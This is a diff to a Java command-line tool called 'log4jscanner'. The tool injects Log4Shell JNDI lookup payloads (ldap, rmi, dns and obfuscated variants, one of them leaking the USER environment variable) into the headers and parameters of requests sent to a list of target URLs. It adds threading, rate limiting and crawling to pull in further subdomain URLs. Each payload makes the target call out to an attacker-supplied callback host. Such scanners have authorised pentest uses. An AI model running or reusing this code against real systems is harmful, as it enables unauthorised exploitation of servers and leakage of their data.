@@ -1,18 +1,32 @@
-import org.apache.http.HttpResponse;
 import org.apache.http.client.HttpClient;
+import org.apache.http.HttpResponse;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.StringEntity;
 import org.apache.http.impl.client.HttpClients;
 import org.apache.http.util.EntityUtils;
-import java.util.Scanner;
-import java.io.File;
-import java.io.BufferedReader;
-import java.io.FileReader;
-import java.util.ArrayList;
+import org.jsoup.Jsoup;
+import org.jsoup.nodes.Document;
+import org.jsoup.select.Elements;
+import org.jsoup.nodes.Element;
+
+import java.io.*;
 import java.net.URLEncoder;
+import java.util.ArrayList;
+import java.util.HashSet;
+import java.util.Scanner;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicInteger;
 
 public class log4jscanner {
+    private static final String OUTPUT_FILE = "extracted_urls.txt";
+    private static HashSet<String> domains = new HashSet<>();
+    private static final int MAX_REQUESTS_BEFORE_PAUSE = 5;
+    private static final long PAUSE_DURATION_IN_MS = 10000;
+
+
 
     public static void main(String[] args) {
         Scanner scanner = new Scanner(System.in);
@@ -20,16 +34,27 @@ public class log4jscanner {
             HttpClient client = HttpClients.createDefault();
             System.out.println("Enter the Burp Collaborator URL:");
             String oobPayload = scanner.nextLine();
-            String payload = "${jndi:ldap://" + oobPayload + "}";
+            String[] payloads = new String[] {
+                    "${jndi:ldap://" + oobPayload + "}",
+//                    "${jndi:ldaps://" + oobPayload + "}",
+//                    "${jndi:dns://" + oobPayload + "}",
+//                    "${jndi:rmi://" + oobPayload + "}",
+//                    "${j${lower:n}di:ldap://" + oobPayload + "}",
+//                    "${${::-j}${::-n}${::-d}${::-i}:ldap://" + oobPayload + "}",
+//                    "${jndi:ldap://" + oobPayload + "/a}",
+//                    "${jndi:ldap://" + oobPayload + "/cn=test}",
+//                    "${jndi:ldap://" + oobPayload + "/${env:USER}}",
+//                    "${${lower:j}${upper:n}${lower:d}i:rmi://" + oobPayload + "}"
+            };
 
             System.out.println("Enter the path to the file containing URLs (one per line):");
             String filePath = scanner.nextLine();
             ArrayList<String> urls = readUrlsFromFile(filePath);
 
             System.out.println("Do you want to add custom headers? (yes/no)");
-            String useCustomHeaders = scanner.nextLine().trim().toLowerCase();
+            String useCustomHeaders = scanner.next().trim().toLowerCase();
+            scanner.nextLine();
             String[] headersToUse;
-
             if ("yes".equals(useCustomHeaders)) {
                 System.out.println("Enter your custom headers (comma-separated):");
                 String customHeaders = scanner.nextLine();
@@ -65,31 +90,61 @@ public class log4jscanner {
             String[] params = paramsInput.split(",");
 
             System.out.println("Do you want to send a GET or POST request? (G/P):");
-            String requestType = scanner.nextLine().trim().toUpperCase();
+            String requestType = scanner.next().trim().toUpperCase();
+            scanner.nextLine();
+            int poolSize = Math.min(5, urls.size());
+            ExecutorService executor = Executors.newFixedThreadPool(poolSize);
 
-            int requestCount = 0;
+            AtomicInteger requestCounter = new AtomicInteger();
             for (String url : urls) {
-                if ("P".equals(requestType)) {
-                    sendPostRequest(client, url, headersToUse, params, payload);
-                } else if ("G".equals(requestType)) {
-                    sendGetRequest(client, url, headersToUse, params, payload);
-                } else {
-                    System.out.println("Invalid request type. Please enter 'G' for GET or 'P' for POST.");
-                    continue;
-                }
+                executor.execute(() -> {
+                    try {
+                        if (requestCounter.getAndIncrement() % MAX_REQUESTS_BEFORE_PAUSE == 0 && requestCounter.get() > 1) {
+                            System.out.println("Pausing due to rate limit...");
+                            Thread.sleep(PAUSE_DURATION_IN_MS);
+                        }
+                        createTask(client, url, headersToUse, params, payloads, requestType).run();
+                    } catch (InterruptedException e) {
+                        Thread.currentThread().interrupt();
+                        System.out.println("Thread was interrupted during rate limit sleep.");
+                    }
+                });
+            }
 
-                requestCount++;
-                if (requestCount % 10 == 0) {
-                    System.out.println("Pausing for 5 seconds...");
-                    Thread.sleep(5000);
+            Thread.sleep(100);
+            ArrayList<String> extractedUrls = readUrlsFromFile(OUTPUT_FILE);
+            for (String url : extractedUrls) {
+                if (!urls.contains(url) && isSubdomain(url)) {
+                    executor.execute(createTask(client, url, headersToUse, params, payloads, requestType));
                 }
             }
+
+            executor.shutdown();
+            executor.awaitTermination(1, TimeUnit.HOURS);
         } catch (Exception e) {
             e.printStackTrace();
         } finally {
             scanner.close();
         }
-        System.out.println("End");
+        System.out.println("End of scanning process.");
+    }
+
+    private static Runnable createTask(HttpClient client, String url, String[] headers, String[] params, String[] payloads, String requestType) {
+        return () -> {
+            for (String payload : payloads) {  // Loop through each payload
+                try {
+                    System.out.println("Processing URL: " + url + " with payload: " + payload);
+                    if (isSubdomain(url)) {
+                        sendRequest(client, url, headers, params, payload, requestType);
+                    } else {
+                        addUrlToFile(url);
+                    }
+                } catch (Exception e) {
+                    System.out.println("Error handling request for URL: " + url + " with payload: " + payload);
+                    e.printStackTrace();
+                }
+            }
+        };
     }
 
     private static ArrayList<String> readUrlsFromFile(String filePath) throws Exception {
@@ -97,11 +152,40 @@ public class log4jscanner {
         try (BufferedReader reader = new BufferedReader(new FileReader(new File(filePath)))) {
             String line;
             while ((line = reader.readLine()) != null) {
-                urls.add(line.trim());
+                String trimmedUrl = line.trim();
+                urls.add(trimmedUrl);
+                domains.add(getDomainName(trimmedUrl));
             }
         }
-        System.out.println(urls.size()+" Count of urls");
         return urls;
+    }
+
+    private static String getDomainName(String url) {
+        return url.substring(url.indexOf("//") + 2).split("/")[0];
+    }
+
+    private static boolean isSubdomain(String url) {
+        String domainName = getDomainName(url);
+        for (String domain : domains) {
+            if (domainName.endsWith(domain)) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private static void addUrlToFile(String url) throws IOException {
+        try (BufferedWriter writer = new BufferedWriter(new FileWriter(OUTPUT_FILE, true))) {
+            writer.write(url + "\n");
+        }
+    }
+    private static void sendRequest(HttpClient client, String url, String[] headers, String[] params, String payload, String requestType) throws Exception {
+        if ("P".equals(requestType)) {
+            sendPostRequest(client, url, headers, params, payload);
+            System.out.println("Sending subdomain....");
+        } else if ("G".equals(requestType)) {
+            sendGetRequest(client, url, headers, params, payload);
+        }
     }
 
     private static void sendPostRequest(HttpClient client, String url, String[] headers, String[] params, String payload) throws Exception {
@@ -111,8 +195,7 @@ public class log4jscanner {
         StringBuilder formData = new StringBuilder();
         for (String param : params) {
             if (formData.length() > 0) formData.append("&");
-            String key = param;
-            formData.append(URLEncoder.encode(key, "UTF-8"))
+            formData.append(URLEncoder.encode(param, "UTF-8"))
                     .append("=")
                     .append(URLEncoder.encode(payload, "UTF-8"));
         }
@@ -124,9 +207,11 @@ public class log4jscanner {
         StringEntity requestEntity = new StringEntity(formData.toString());
         postRequest.setEntity(requestEntity);
 
-        printRequestHeaders(postRequest);
         HttpResponse response = client.execute(postRequest);
-        printResponseDetails(response);
+        String responseBody = EntityUtils.toString(response.getEntity());
+        EntityUtils.consume(response.getEntity());
+        printResponseDetails(response, responseBody);
+        extractUrls(url, responseBody);
     }
 
     private static void sendGetRequest(HttpClient client, String url, String[] headers, String[] params, String payload) throws Exception {
@@ -134,8 +219,7 @@ public class log4jscanner {
         urlWithParams.append("?");
         for (String param : params) {
             if (urlWithParams.charAt(urlWithParams.length() - 1) != '?') urlWithParams.append("&");
-            String key = param;
-            urlWithParams.append(URLEncoder.encode(key, "UTF-8"))
+            urlWithParams.append(URLEncoder.encode(param, "UTF-8"))
                     .append("=")
                     .append(URLEncoder.encode(payload, "UTF-8"));
         }
@@ -145,29 +229,28 @@ public class log4jscanner {
             getRequest.setHeader(header.trim(), payload);
         }
 
-        printRequestHeaders(getRequest);
         HttpResponse response = client.execute(getRequest);
-        printResponseDetails(response);
+        String responseBody = EntityUtils.toString(response.getEntity());
+        EntityUtils.consume(response.getEntity());
+        printResponseDetails(response, responseBody);
+        extractUrls(url, responseBody);
     }
 
-    private static void printRequestHeaders(HttpGet getRequest) {
-        System.out.println("The GET request sent is:");
-        System.out.println(getRequest);
-        for (int i = 0; i < getRequest.getAllHeaders().length; i++) {
-            System.out.println(getRequest.getAllHeaders()[i]);
-        }
-    }
-
-    private static void printRequestHeaders(HttpPost postRequest) {
-        System.out.println("The POST request sent is:");
-        System.out.println(postRequest);
-        for (int i = 0; i < postRequest.getAllHeaders().length; i++) {
-            System.out.println(postRequest.getAllHeaders()[i]);
-        }
-    }
-
-    private static void printResponseDetails(HttpResponse response) throws Exception {
+    private static void printResponseDetails(HttpResponse response, String responseBody) {
         System.out.println("HTTP Response Code: " + response.getStatusLine().getStatusCode());
-        System.out.println("Response Body: " + EntityUtils.toString(response.getEntity()));
+        System.out.println("Response Body: " + responseBody);
+    }
+
+    private static void extractUrls(String baseUrl, String htmlContent) throws IOException {
+        Document doc = Jsoup.parse(htmlContent, baseUrl);
+        Elements links = doc.select("a[href], form[action]");
+        try (BufferedWriter writer = new BufferedWriter(new FileWriter(OUTPUT_FILE, true))) {
+            for (Element link : links) {
+                String foundUrl = link.tagName().equals("form") ? link.absUrl("action") : link.absUrl("href");
+                if (!foundUrl.isEmpty()) {
+                    writer.write(foundUrl + "\n");
+                }
+            }
+        }
     }
 }
